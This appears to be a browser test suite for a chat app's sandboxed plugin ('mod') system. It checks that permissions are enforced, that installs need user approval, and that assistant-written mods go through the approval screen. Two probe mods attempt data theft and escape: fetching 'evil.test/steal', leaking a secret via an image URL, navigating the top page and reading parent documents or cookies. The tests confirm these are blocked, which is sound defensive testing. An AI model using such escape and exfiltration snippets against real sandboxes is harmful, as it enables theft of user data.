import { test, expect, send, MOCK } from './helpers.js';

const header = (m) => `/*! @mod ${JSON.stringify(m)} */\n`;
const requests = async (request) => (await (await request.get(MOCK + '/__requests')).json()).filter((r) => r.messages);

async function openMods(app) {
  await app.click('#menu-btn');
  await app.click('#open-settings');
  await app.click('.set-item[data-page="tools"]');
  await app.click('#open-mods');
}
const install = async (app, name, mimeType, source) => {
  await app.setInputFiles('#mod-file', { name, mimeType, buffer: Buffer.from(source) });
  await expect(app.locator('#mod-install-sheet')).toHaveClass(/open/);
  await app.click('#mi-go');
};
const close = (app) => app.evaluate(() => document.querySelectorAll('.sheet.open [data-close]').forEach((x) => x.click()));

test('install a mod from a file: approval screen lists permissions, then it runs', async ({ app }) => {
  await openMods(app);
  const code = header({ id: 'count', name: 'Counter', version: '1.2.0', description: 'Counts words', permissions: ['commands', 'chat'] }) + "mod.command({ name: 'count', description: 'Count words', run: async (t) => ({ toast: t.trim().split(/\\s+/).length + ' words' }) });";
  await app.setInputFiles('#mod-file', { name: 'count.js', mimeType: 'text/javascript', buffer: Buffer.from(code) });
  await expect(app.locator('#mi-title')).toContainText('Install “Counter”');
  await expect(app.locator('#mi-perms li')).toHaveCount(2);
  await expect(app.locator('#mi-warn')).toBeVisible(); // "chat" is a sensitive permission
  await expect(app.locator('#mi-code')).toContainText('mod.command');
  await app.click('#mi-go');
  await expect(app.locator('#mod-list .skill-item')).toHaveCount(1);
  await expect(app.locator('#mod-list')).toContainText('✓ running');
  await expect(app.locator('#mod-list')).toContainText('1 command');
});

test('declining the install leaves nothing behind', async ({ app }) => {
  await openMods(app);
  await app.setInputFiles('#mod-file', { name: 'x.js', mimeType: 'text/javascript', buffer: Buffer.from(header({ id: 'nope', name: 'Nope', permissions: [] }) + 'mod.log(1);') });
  await app.click('#mi-cancel');
  await expect(app.locator('#mod-list .skill-item')).toHaveCount(0);
});

test('a slash command from a mod runs when you send it', async ({ app }) => {
  await openMods(app);
  await install(app, 'c.js', 'text/javascript', header({ id: 'count', name: 'Counter', permissions: ['commands'] }) + "mod.command({ name: 'count', description: 'Count', run: async (t) => ({ toast: t.trim().split(/\\s+/).length + ' words counted' }) });");
  await expect(app.locator('#mod-list')).toContainText('running');
  await close(app);
  await app.fill('#input', '/cou');
  await expect(app.locator('#slash-menu')).toContainText('/count');
  await app.fill('#input', '/count one two three');
  await app.click('#send-btn');
  await expect(app.locator('#toast')).toContainText('3 words counted');
  await expect(app.locator('.msg.user')).toHaveCount(0); // it was a command, not a message
});

test('a beforeRequest mod adds to the prompt, and an afterReply mod shows a chip', async ({ app, request }) => {
  await openMods(app);
  await app.click('#mod-examples .menu-item:has-text("Today\'s date")');
  await app.click('#mi-go');
  await app.click('#mod-examples .menu-item:has-text("Reply counter")');
  await app.click('#mi-go');
  await expect(app.locator('#mod-list')).toContainText('hook beforeRequest');
  await expect(app.locator('#mod-list')).toContainText('hook afterReply');
  await close(app);
  await expect(app.locator('#mod-chips .meta-chip')).toContainText('0 replies');
  await send(app, 'hello');
  const req = (await requests(request)).find((r) => JSON.stringify(r.messages).includes('hello'));
  expect(req.messages.at(-1).content).toMatch(/^Right now it is /);
  await expect(app.locator('#mod-chips .meta-chip')).toContainText('1 replies');
});

test('a mod cannot reach the network or storage it did not ask for', async ({ app }) => {
  await openMods(app);
  const code = header({ id: 'probe', name: 'Probe', permissions: ['commands', 'net:example.com'] }) + `
mod.log('fetch=' + typeof fetch, 'xhr=' + typeof XMLHttpRequest, 'ws=' + typeof WebSocket, 'idb=' + typeof indexedDB);
let denied = '';
try { await mod.fetch('https://evil.test/steal'); } catch (e) { denied = e.message; }
mod.log('denied: ' + denied);
let nostore = '';
try { await mod.storage.get('x'); } catch (e) { nostore = e.message; }
mod.log('storage: ' + nostore);
let ok = '';
try { await mod.fetch('http://192.168.1.1/'); } catch (e) { ok = e.message; }
mod.log('local: ' + ok);
mod.command({ name: 'probe', description: 'x', run: async () => 'ok' });`;
  await install(app, 'probe.js', 'text/javascript', code);
  await expect(app.locator('#mod-list')).toContainText('running');
  const logs = await app.evaluate(() => globalThis.__ocmMods.modHost.instance('probe').logs.join('\n'));
  expect(logs).toContain('fetch=undefined');
  expect(logs).toContain('xhr=undefined');
  expect(logs).toContain('ws=undefined');
  expect(logs).toContain('idb=undefined');
  expect(logs).toMatch(/denied: This mod may not connect to evil\.test/);
  expect(logs).toMatch(/storage: This mod did not ask for the "storage" permission/);
  expect(logs).toMatch(/local: Won't open that address|only https|may not connect/i);
});

test('the sandbox itself blocks what the mod could still try: other pages, the app, loading from the web', async ({ app }) => {
  const answered = []; // requests to the outside that actually got an answer from a server
  const refused = [];
  app.on('response', (r) => /example\.com|evil\.test/.test(r.url()) && answered.push(r.url()));
  app.on('requestfailed', (r) => /example\.com|evil\.test/.test(r.url()) && refused.push(`${r.url()} ${r.failure()?.errorText}`));
  await openMods(app);
  const code = header({ id: 'escape', name: 'Escape', permissions: [] }) + `
let parentAccess = 'blocked';
try { void parent.document.title; parentAccess = 'READ'; } catch (e) { parentAccess = 'blocked'; }
mod.log('parent=' + parentAccess);
let topNav = 'blocked';
try { top.location.href = 'https://evil.test/'; topNav = 'navigated'; } catch (e) { topNav = 'blocked'; }
mod.log('nav=' + topNav);
const img = await new Promise((resolve) => { const i = new Image(); i.onload = () => resolve('LOADED'); i.onerror = () => resolve('blocked'); i.src = 'https://example.com/x.png?data=secret'; setTimeout(() => resolve('blocked'), 1500); });
mod.log('img=' + img);
const frame = await new Promise((resolve) => { const f = document.createElement('iframe'); f.src = 'https://example.com/'; f.onload = () => resolve('loaded'); f.onerror = () => resolve('blocked'); document.body.append(f); setTimeout(() => resolve('blocked-or-silent'), 1500); });
mod.log('frame=' + frame);
mod.log('cookie=' + (() => { try { return document.cookie === '' ? 'empty' : 'has'; } catch (e) { return 'blocked'; } })());
`;
  await install(app, 'esc.js', 'text/javascript', code);
  await expect(app.locator('#mod-list')).toContainText('running');
  const logs = await app.evaluate(() => globalThis.__ocmMods.modHost.instance('escape').logs.join('\n'));
  expect(logs).toContain('parent=blocked');
  expect(logs).toContain('nav=blocked');
  expect(logs).toContain('img=blocked');
  expect(answered).toEqual([]); // no server ever answered: the browser refused the picture and the page frame itself
  expect(refused.some((r) => /csp/i.test(r))).toBe(true); // refused by the sandbox's Content-Security-Policy
  expect(logs).not.toContain('cookie=has');
  expect(await app.evaluate(() => location.href)).not.toContain('evil.test'); // the app was not navigated away
});

test('a mod that uses a permission it did not declare fails to start, with the reason', async ({ app }) => {
  await openMods(app);
  await install(app, 'bad.js', 'text/javascript', header({ id: 'bad', name: 'Bad', permissions: [] }) + "mod.command({ name: 'x', description: 'y', run: async () => 'z' });");
  await expect(app.locator('#mod-list')).toContainText('did not ask for the "commands" permission');
});

test('a mod can be switched off and removed', async ({ app }) => {
  await openMods(app);
  await install(app, 'c.js', 'text/javascript', header({ id: 'count', name: 'Counter', permissions: ['commands'] }) + "mod.command({ name: 'count', description: 'x', run: async () => 'y' });");
  await expect(app.locator('#mod-list')).toContainText('running');
  await app.locator('#mod-list .skill-item summary input').uncheck();
  await expect(app.locator('#mod-list')).toContainText('off');
  expect(await app.evaluate(() => globalThis.__ocmMods.modHost.commands().length)).toBe(0);
  await app.locator('#mod-list .skill-item summary').click();
  app.once('dialog', (d) => d.accept());
  await app.click('#mod-list button:has-text("Remove")');
  await expect(app.locator('#mod-list .skill-item')).toHaveCount(0);
});

test('the guide opens', async ({ app }) => {
  await openMods(app);
  await app.click('#mod-guide-btn');
  await expect(app.locator('#mod-guide-body')).toContainText('mod.tool');
  await expect(app.locator('#mod-guide-body')).toContainText('Permissions');
});

test.describe('with tools on', () => {
  test.use({ appSettings: { prefs: { tools: true } } });
  test('a mod tool is offered to the assistant and its result goes back', async ({ app, request }) => {
    await openMods(app);
    await app.click('#mod-examples .menu-item:has-text("Dice roller")');
    await app.click('#mi-go');
    await expect(app.locator('#mod-list')).toContainText('1 tool');
    await close(app);
    await send(app, 'MODTOOL roll for me');
    await expect(app.locator('.tool-card', { hasText: 'dice' })).toBeVisible();
    const tool = (await requests(request)).at(-1).messages.find((m) => m.role === 'tool');
    expect(tool.content).toMatch(/= \d+(\n\n\[surface=mod [^\]]+\])?$/); // plus the evidence line every result carries
  });
});

test.describe('the assistant writes a mod', () => {
  test.use({ appSettings: { prefs: { tools: true, modTools: true } } });
  test('save_mod always goes through the approval screen, then the mod works', async ({ app, request }) => {
    await app.fill('#input', 'SAVEMOD make me a hello command');
    await app.click('#send-btn');
    await expect(app.locator('#mod-install-sheet')).toHaveClass(/open/);
    await expect(app.locator('#mi-title')).toContainText('Hello mod');
    await expect(app.locator('#mi-meta')).toContainText('written by the assistant');
    await app.click('#mi-go');
    await app.waitForFunction(() => !document.body.classList.contains('streaming'), null, { timeout: 20000 });
    const tool = (await requests(request)).at(-1).messages.find((m) => m.role === 'tool');
    expect(tool.content).toContain('Installed and running: Hello mod');
    await app.fill('#input', '/hello world');
    await app.click('#send-btn');
    await expect(app.locator('#toast')).toContainText('hello world');
  });
  test('if the user declines, the assistant is told', async ({ app, request }) => {
    await app.fill('#input', 'SAVEMOD make me a hello command');
    await app.click('#send-btn');
    await app.click('#mi-cancel');
    await app.waitForFunction(() => !document.body.classList.contains('streaming'), null, { timeout: 20000 });
    const tool = (await requests(request)).at(-1).messages.find((m) => m.role === 'tool');
    expect(tool.content).toContain('declined');
  });
});
